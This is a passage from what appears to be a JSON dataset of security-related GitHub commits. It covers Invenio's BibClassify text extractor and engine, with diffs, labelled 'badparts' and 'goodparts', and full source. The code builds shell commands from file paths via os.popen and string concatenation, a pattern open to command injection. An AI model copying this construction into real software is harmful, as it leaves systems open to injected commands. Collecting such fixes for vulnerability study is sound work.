_ONE_WORD.search(line) is not None]", "    if not remote:", "        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))", "    return lines", "def _is_english_text(text):", "    \"\"\"", "    Checks if a text is correct english.", "    Computes the number of words in the text and compares it to the", "    expected number of words (based on an average size of words of 5.1", "    letters).", "    @param text_lines: the text to analyze", "    @type text_lines:  string", "    @return:           True if the text is English, False otherwise", "    @rtype:            Boolean", "    \"\"\"", "    avg_word_length = 2.55 + 1", "    expected_word_number = float(len(text)) / avg_word_length", "    words = [word", "             for word in re.split('\\W', text)", "             if word.isalpha()]", "    word_number = len(words)", "    return word_number > expected_word_number", "def text_lines_from_url(url, user_agent=\"\"):", "    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"", "    request = urllib2.Request(url)", "    if user_agent:", "        request.add_header(\"User-Agent\", user_agent)", "    try:", "        distant_stream = urlopen(request)", "        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]", "        local_stream = open(local_file, \"w\")", "        local_stream.write(distant_stream.read())", "        local_stream.close()", "    except:", "        log.error(\"Unable to read from URL %s.\" % url)", "        return None", "    else:", "        lines = text_lines_from_local_file(local_file, remote=True)", "        os.remove(local_file)", "        line_nb = len(lines)", "        word_nb = 0", "        for line in lines:", "            word_nb += len(re.findall(\"\\S+\", line))", "        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))", "        return lines", "    \"\"\"Tests if an executable is available on the system.\"\"\""], "goodparts": ["    return [line for line in lines if _ONE_WORD.search(line) is not None]", "    \"\"\"Test if an executable is available on the system.\"\"\""]}], "source": "\n \"\"\" BibClassify text extractor. This module provides method to extract the fulltext from local or remote documents. Currently 2 formats of documents are supported: PDF and text documents. 2 methods provide the functionality of the module: text_lines_from_local_file and text_lines_from_url. This module also provides the utility 'is_pdf' that uses GNU file in order to determine if a local file is a PDF file. This module is STANDALONE safe \"\"\" import os import re import tempfile import urllib2 from invenio.legacy.bibclassify import config as bconfig if bconfig.STANDALONE: from urllib2 import urlopen else: from invenio.utils.url import make_invenio_opener urlopen=make_invenio_opener('BibClassify').open log=bconfig.get_logger(\"bibclassify.text_extractor\") _ONE_WORD=re.compile(\"[A-Za-z]{2,}\") def is_pdf(document): \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\" if not executable_exists('pdftotext'): log.warning(\"GNU file was not found on the system. \" \"Switching to a weak file extension test.\") if document.lower().endswith(\".pdf\"): return True return False file_output=os.popen('file ' +re.escape(document)).read() try: filetype=file_output.split(\":\")[1] except IndexError: log.error(\"Your version of the 'file' utility seems to \" \"be unsupported. Please report this to cds.support@cern.ch.\") raise Exception('Incompatible pdftotext') pdf=filetype.find(\"PDF\") > -1 return pdf def text_lines_from_local_file(document, remote=False): \"\"\"Returns the fulltext of the local file. @var document: fullpath to the file that should be read @var remote: boolean, if True does not count lines(gosh!) @return: list of lines if st was read or an empty list\"\"\" try: if is_pdf(document): if not executable_exists(\"pdftotext\"): log.error(\"pdftotext is not available on the system.\") cmd=\"pdftotext -q -enc UTF-8 %s -\" % re.escape(document) filestream=os.popen(cmd) else: filestream=open(document, \"r\") except IOError as ex1: log.error(\"Unable to read from file %s.(%s)\" %(document, ex1.strerror)) return[] lines=[line.decode(\"utf-8\", 'replace') for line in filestream] filestream.close() if not _is_english_text('\\n'.join(lines)): log.warning(\"It seems the file '%s' is unvalid and doesn't \" \"contain text. Please communicate this file to the Invenio \" \"team.\" % document) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) lines=[line for line in lines if _ONE_WORD.search(line) is not None] if not remote: log.info(\"Local file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def _is_english_text(text): \"\"\" Checks if a text is correct english. Computes the number of words in the text and compares it to the expected number of words(based on an average size of words of 5.1 letters). @param text_lines: the text to analyze @type text_lines: string @return: True if the text is English, False otherwise @rtype: Boolean \"\"\" avg_word_length=2.55 +1 expected_word_number=float(len(text)) / avg_word_length words=[word for word in re.split('\\W', text) if word.isalpha()] word_number=len(words) return word_number > expected_word_number def text_lines_from_url(url, user_agent=\"\"): \"\"\"Returns the fulltext of the file found at the URL.\"\"\" request=urllib2.Request(url) if user_agent: request.add_header(\"User-Agent\", user_agent) try: distant_stream=urlopen(request) local_file=tempfile.mkstemp(prefix=\"bibclassify.\")[1] local_stream=open(local_file, \"w\") local_stream.write(distant_stream.read()) local_stream.close() except: log.error(\"Unable to read from URL %s.\" % url) return None else: lines=text_lines_from_local_file(local_file, remote=True) os.remove(local_file) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) log.info(\"Remote file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def executable_exists(executable): \"\"\"Tests if an executable is available on the system.\"\"\" for directory in os.getenv(\"PATH\").split(\":\"): if os.path.exists(os.path.join(directory, executable)): return True return False ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\n\"\"\"\nBibClassify text extractor.\n\nThis module provides method to extract the fulltext from local or remote\ndocuments. Currently 2 formats of documents are supported: PDF and text\ndocuments.\n\n2 methods provide the functionality of the module: text_lines_from_local_file\nand text_lines_from_url.\n\nThis module also provides the utility 'is_pdf' that uses GNU file in order to\ndetermine if a local file is a PDF file.\n\nThis module is STANDALONE safe\n\"\"\"\n\nimport os\nimport re\nimport tempfile\nimport urllib2\nfrom invenio.legacy.bibclassify import config as bconfig\n\nif bconfig.STANDALONE:\n    from urllib2 import urlopen\nelse:\n    from invenio.utils.url import make_invenio_opener\n\n    urlopen = make_invenio_opener('BibClassify').open\n\nlog = bconfig.get_logger(\"bibclassify.text_extractor\")\n\n_ONE_WORD = re.compile(\"[A-Za-z]{2,}\")\n\n\ndef is_pdf(document):\n    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n    if not executable_exists('pdftotext'):\n        log.warning(\"GNU file was not found on the system. \"\n                    \"Switching to a weak file extension test.\")\n        if document.lower().endswith(\".pdf\"):\n            return True\n        return False\n        # Tested with file version >= 4.10. First test is secure and works\n    # with file version 4.25. Second condition is tested for file\n    # version 4.10.\n    file_output = os.popen('file ' + re.escape(document)).read()\n    try:\n        filetype = file_output.split(\":\")[1]\n    except IndexError:\n        log.error(\"Your version of the 'file' utility seems to \"\n                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n        raise Exception('Incompatible pdftotext')\n\n    pdf = filetype.find(\"PDF\") > -1\n    # This is how it should be done however this is incompatible with\n    # file version 4.10.\n    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n    return pdf\n\n\ndef text_lines_from_local_file(document, remote=False):\n    \"\"\"Returns the fulltext of the local file.\n    @var document: fullpath to the file that should be read\n    @var remote: boolean, if True does not count lines (gosh!)\n    @return: list of lines if st was read or an empty list\"\"\"\n\n    try:\n        if is_pdf(document):\n            if not executable_exists(\"pdftotext\"):\n                log.error(\"pdftotext is not available on the system.\")\n            cmd = \"pdftotext -q -enc UTF-8 %s -\" % re.escape(document)\n            filestream = os.popen(cmd)\n        else:\n            filestream = open(document, \"r\")\n    except IOError as ex1:\n        log.error(\"Unable to read from file %s. (%s)\" % (document, ex1.strerror))\n        return []\n\n    # FIXME - we assume it is utf-8 encoded / that is not good\n    lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n    filestream.close()\n\n    if not _is_english_text('\\n'.join(lines)):\n        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n                    \"contain text. Please communicate this file to the Invenio \"\n                    \"team.\" % document)\n\n    line_nb = len(lines)\n    word_nb = 0\n    for line in lines:\n        word_nb += len(re.findall(\"\\S+\", line))\n\n    # Discard lines that do not contain at least one word.\n    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n\n    if not remote:\n        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n\n    return lines\n\n\ndef _is_english_text(text):\n    \"\"\"\n    Checks if a text is correct english.\n    Computes the number of words in the text and compares it to the\n    expected number of words (based on an average size of words of 5.1\n    letters).\n\n    @param text_lines: the text to analyze\n    @type text_lines:  string\n    @return:           True if the text is English, False otherwise\n    @rtype:            Boolean\n    \"\"\"\n    # Consider one word and one space.\n    avg_word_length = 2.55 + 1\n    expected_word_number = float(len(text)) / avg_word_length\n\n    words = [word\n             for word in re.split('\\W', text)\n             if word.isalpha()]\n\n    word_number = len(words)\n\n    return word_number > expected_word_number\n\n\ndef text_lines_from_url(url, user_agent=\"\"):\n    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n    request = urllib2.Request(url)\n    if user_agent:\n        request.add_header(\"User-Agent\", user_agent)\n    try:\n        distant_stream = urlopen(request)\n        # Write the URL content to a temporary file.\n        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n        local_stream = open(local_file, \"w\")\n        local_stream.write(distant_stream.read())\n        local_stream.close()\n    except:\n        log.error(\"Unable to read from URL %s.\" % url)\n        return None\n    else:\n        # Read lines from the temporary file.\n        lines = text_lines_from_local_file(local_file, remote=True)\n        os.remove(local_file)\n\n        line_nb = len(lines)\n        word_nb = 0\n        for line in lines:\n            word_nb += len(re.findall(\"\\S+\", line))\n\n        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n\n        return lines\n\n\ndef executable_exists(executable):\n    \"\"\"Tests if an executable is available on the system.\"\"\"\n    for directory in os.getenv(\"PATH\").split(\":\"):\n        if os.path.exists(os.path.join(directory, executable)):\n            return True\n    return False\n\n\n"}}, "msg": "classifier: support colons in file paths\n\n* FIX Properly handles file paths containing a colon (:), avoiding\n  bad text extraction that causes (1) wrong results and (2) much slower\n  execution.\n\n* Improves the reporting of problems in the ontology.\n\n* Removes check if PDF text is English as it is irrelevant.\n\n* Refactors a bit the code to download remote files.\n\nSigned-off-by: Jan Aage Lavik <jan.age.lavik@cern.ch>"}}, "https://github.com/chokribr/invenio": {"4b56c071c54a0e1f1a86dca49fe455207d4148c7": {"url": "https://api.github.com/repos/chokribr/invenio/commits/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "html_url": "https://github.com/chokribr/invenio/commit/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "sha": "4b56c071c54a0e1f1a86dca49fe455207d4148c7", "keyword": "remote code execution improve", "diff": "diff --git a/invenio/legacy/bibclassify/engine.py b/invenio/legacy/bibclassify/engine.py\nindex 561dbdfbc..ec35dd6b9 100644\n--- a/invenio/legacy/bibclassify/engine.py\n+++ b/invenio/legacy/bibclassify/engine.py\n@@ -35,6 +35,7 @@\n from __future__ import print_function\n \n import os\n+import re\n from six import iteritems\n import config as bconfig\n \n@@ -44,8 +45,8 @@\n import keyword_analyzer as keyworder\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n@@ -60,7 +61,6 @@ def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\"\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                 api=False, **kwargs):\n     \"\"\"Output the keywords for each source in sources.\"\"\"\n-\n     # Inner function which does the job and it would be too much work to\n     # refactor the call (and it must be outside the loop, before it did\n     # not process multiple files)\n@@ -68,6 +68,12 @@ def process_lines():\n         if output_mode == \"text\":\n             print(\"Input file: %s\" % source)\n \n+        line_nb = len(text_lines)\n+        word_nb = 0\n+        for line in text_lines:\n+            word_nb += len(re.findall(\"\\S+\", line))\n+\n+        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n         output = get_keywords_from_text(\n             text_lines,\n             taxonomy_name,\n@@ -110,8 +116,8 @@ def process_lines():\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n@@ -122,9 +128,10 @@ def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-    as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n@@ -147,7 +154,7 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n@@ -165,7 +172,6 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n         (single_keywords, composite_keywords, author_keywords, acronyms)\n         for other output modes it returns formatted string\n     \"\"\"\n-\n     cache = reader.get_cache(taxonomy_name)\n     if not cache:\n         reader.set_cache(taxonomy_name,\n@@ -202,7 +208,8 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {\ndiff --git a/invenio/legacy/bibclassify/ontology_reader.py b/invenio/legacy/bibclassify/ontology_reader.py\nindex 25624f0e9..008ee553f 100644\n--- a/invenio/legacy/bibclassify/ontology_reader.py\n+++ b/invenio/legacy/bibclassify/ontology_reader.py\n@@ -485,12 +485,11 @@ def _get_ckw_components(new_vals, label):\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"\"\ndiff --git a/invenio/legacy/bibclassify/text_extractor.py b/invenio/legacy/bibclassify/text_extractor.py\nindex 4fcb10352..56fa43c6b 100644\n--- a/invenio/legacy/bibclassify/text_extractor.py\n+++ b/invenio/legacy/bibclassify/text_extractor.py\n@@ -1,7 +1,7 @@\n # -*- coding: utf-8 -*-\n #\n # This file is part of Invenio.\n-# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n+# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014, 2015 CERN.\n #\n # Invenio is free software; you can redistribute it and/or\n # modify it under the terms of the GNU General Public License as\n@@ -17,8 +17,7 @@\n # along with Invenio; if not, write to the Free Software Foundation, Inc.,\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n@@ -35,8 +34,7 @@\n \n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n@@ -52,7 +50,7 @@\n \n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n@@ -64,25 +62,25 @@ def is_pdf(document):\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n@@ -99,85 +97,13 @@ def text_lines_from_local_file(document, remote=False):\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "message": "", "files": {"/invenio/legacy/bibclassify/engine.py": {"changes": [{"diff": "\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["from invenio.utils.url import make_user_agent_string"], "goodparts": ["from invenio.utils.filedownload import download_url"]}, {"diff": "\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n", "add": 2, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["            text_lines = extractor.text_lines_from_url(entry,", "                                                       user_agent=make_user_agent_string(\"BibClassify\"))"], "goodparts": ["            local_file = download_url(entry)", "            text_lines = extractor.text_lines_from_local_file(local_file)"]}, {"diff": "\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-    as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n", "add": 3, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Outputs keywords reading a local file. Arguments and output are the same", "    as for :see: get_keywords_from_text() \"\"\""], "goodparts": ["    \"\"\"Output keywords reading a local file.", "    Arguments and output are the same as for :see: get_keywords_from_text().", "    \"\"\""]}, {"diff": "\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Extract keywords from the list of strings"], "goodparts": ["    \"\"\"Extract keywords from the list of strings."]}, {"diff": "\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {", "add": 2, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Find single keywords in the fulltext"], "goodparts": ["    \"\"\"Find single keywords in the fulltext."]}], "source": "\n \"\"\" BibClassify engine. This module is the main module of BibClassify. its two main methods are output_keywords_for_sources and get_keywords_from_text. The first one output keywords for a list of sources(local files or URLs, PDF or text) while the second one outputs the keywords for text lines(which are obtained using the module bibclassify_text_normalizer). This module also takes care of the different outputs(text, MARCXML or HTML). But unfortunately there is a confusion between running in a standalone mode and producing output suitable for printing, and running in a web-based mode where the webtemplate is used. For the moment the pieces of the representation code are left in this module. \"\"\" from __future__ import print_function import os from six import iteritems import config as bconfig from invenio.legacy.bibclassify import ontology_reader as reader import text_extractor as extractor import text_normalizer as normalizer import keyword_analyzer as keyworder import acronym_analyzer as acronymer from invenio.utils.url import make_user_agent_string from invenio.utils.text import encode_for_xml log=bconfig.get_logger(\"bibclassify.engine\") def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Output the keywords for each source in sources.\"\"\" def process_lines(): if output_mode==\"text\": print(\"Input file: %s\" % source) output=get_keywords_from_text( text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms ) if api: return output else: if isinstance(output, dict): for i in output: print(output[i]) for entry in input_sources: log.info(\"Trying to read input file %s.\" % entry) text_lines=None source=\"\" if os.path.isdir(entry): for filename in os.listdir(entry): if filename.startswith('.'): continue filename=os.path.join(entry, filename) if os.path.isfile(filename): text_lines=extractor.text_lines_from_local_file(filename) if text_lines: source=filename process_lines() elif os.path.isfile(entry): text_lines=extractor.text_lines_from_local_file(entry) if text_lines: source=os.path.basename(entry) process_lines() else: text_lines=extractor.text_lines_from_url(entry, user_agent=make_user_agent_string(\"BibClassify\")) if text_lines: source=entry.split(\"/\")[-1] process_lines() def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Outputs keywords reading a local file. Arguments and output are the same as for:see: get_keywords_from_text() \"\"\" log.info(\"Analyzing keywords for local file %s.\" % local_file) text_lines=extractor.text_lines_from_local_file(local_file) return get_keywords_from_text(text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms) def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, **kwargs): \"\"\"Extract keywords from the list of strings :param text_lines: list of strings(will be normalized before being joined into one string) :param taxonomy_name: string, name of the taxonomy_name :param output_mode: string -text|html|marcxml|raw :param output_limit: int :param spires: boolean, if True marcxml output reflect spires codes. :param match_mode: str -partial|full; in partial mode only beginning of the fulltext is searched. :param no_cache: boolean, means loaded definitions will not be saved. :param with_author_keywords: boolean, extract keywords from the pdfs. :param rebuild_cache: boolean :param only_core_tags: boolean :return: if output_mode=raw, it will return (single_keywords, composite_keywords, author_keywords, acronyms) for other output modes it returns formatted string \"\"\" cache=reader.get_cache(taxonomy_name) if not cache: reader.set_cache(taxonomy_name, reader.get_regular_expressions(taxonomy_name, rebuild=rebuild_cache, no_cache=no_cache)) cache=reader.get_cache(taxonomy_name) _skw=cache[0] _ckw=cache[1] text_lines=normalizer.cut_references(text_lines) fulltext=normalizer.normalize_fulltext(\"\\n\".join(text_lines)) if match_mode==\"partial\": fulltext=_get_partial_text(fulltext) author_keywords=None if with_author_keywords: author_keywords=extract_author_keywords(_skw, _ckw, fulltext) acronyms={} if extract_acronyms: acronyms=extract_abbreviations(fulltext) single_keywords=extract_single_keywords(_skw, fulltext) composite_keywords=extract_composite_keywords(_ckw, fulltext, single_keywords) if only_core_tags: single_keywords=clean_before_output(_filter_core_keywors(single_keywords)) composite_keywords=_filter_core_keywors(composite_keywords) else: single_keywords=clean_before_output(single_keywords) return get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords, acronyms, output_mode, output_limit, spires, only_core_tags) def extract_single_keywords(skw_db, fulltext): \"\"\"Find single keywords in the fulltext :var skw_db: list of KeywordToken objects :var fulltext: string, which will be searched :return: dictionary of matches in a format{ <keyword object>,[[position, position...],], .. } or empty{} \"\"\" return keyworder.get_single_keywords(skw_db, fulltext) or{} def extract_composite_keywords(ckw_db, fulltext, skw_spans): \"\"\"Returns a list of composite keywords bound with the number of occurrences found in the text string. :var ckw_db: list of KewordToken objects(they are supposed to be composite ones) :var fulltext: string to search in :skw_spans: dictionary of already identified single keywords :return: dictionary of matches in a format{ <keyword object>,[[position, position...],[info_about_matches]], .. } or empty{} \"\"\" return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or{} def extract_abbreviations(fulltext): \"\"\"Extract acronyms from the fulltext :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" acronyms={} K=reader.KeywordToken for k, v in acronymer.get_acronyms(fulltext).items(): acronyms[K(k, type='acronym')]=v return acronyms def extract_author_keywords(skw_db, ckw_db, fulltext): \"\"\"Finds out human defined keyowrds in a text string. Searches for the string \"Keywords:\" and its declinations and matches the following words. :var skw_db: list single kw object :var ckw_db: list of composite kw objects :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" akw={} K=reader.KeywordToken for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items(): akw[K(k, type='author-kw')]=v return akw def get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords=None, acronyms=None, style=\"text\", output_limit=0, spires=False, only_core_tags=False): \"\"\"Returns a formatted string representing the keywords according to the chosen style. This is the main routing call, this function will also strip unwanted keywords before output and limits the number of returned keywords :var single_keywords: list of single keywords :var composite_keywords: list of composite keywords :var taxonomy_name: string, taxonomy name :keyword author_keywords: dictionary of author keywords extracted from fulltext :keyword acronyms: dictionary of extracted acronyms :keyword style: text|html|marc :keyword output_limit: int, number of maximum keywords printed(it applies to single and composite keywords separately) :keyword spires: boolen meaning spires output style :keyword only_core_tags: boolean \"\"\" categories={} single_keywords_p=_sort_kw_matches(single_keywords) 